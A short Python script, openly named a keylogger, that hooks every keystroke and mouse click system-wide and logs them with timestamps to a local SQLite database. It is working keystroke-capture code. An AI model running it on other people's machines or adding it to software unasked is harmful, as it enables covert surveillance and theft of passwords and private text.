import time
import keyboard
import mouse
import sqlite3


with sqlite3.connect("keylogger.db") as conn:
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS events (
            name TEXT,
            event_type TEXT,
            is_repeat INTEGER NOT NULL,
            created DATETIME DEFAULT CURRENT_TIMESTAMP
        );
    """)

last_event = None


def register_event(event_name, event_type, is_repeat_event=False):
    print('register: ', event_name, event_type)
    with sqlite3.connect("keylogger.db") as conn:
        cursor = conn.cursor()
        cursor.execute(
            'INSERT INTO events (name, event_type, is_repeat) VALUES (?, ?, ?)',
            (event_name, event_type, is_repeat_event)
        )

def register_keyboard_event(event):
    global last_event

    is_repeat_event = event.name + event.event_type == last_event
    register_event(event.name, event.event_type, int(is_repeat_event))
    last_event = event.name + event.event_type


def register_mouse_event(event):
    if type(event) != mouse.ButtonEvent: 
        return

    register_event('mouse_' + event.button, event.event_type)


if __name__ == "__main__":
    while True:
        try:
            keyboard.hook(register_keyboard_event)
            mouse.hook(register_mouse_event)
            keyboard.wait()
        except Exception as e:
            print(e)
        
        print('Reinitializing')
        time.sleep(5)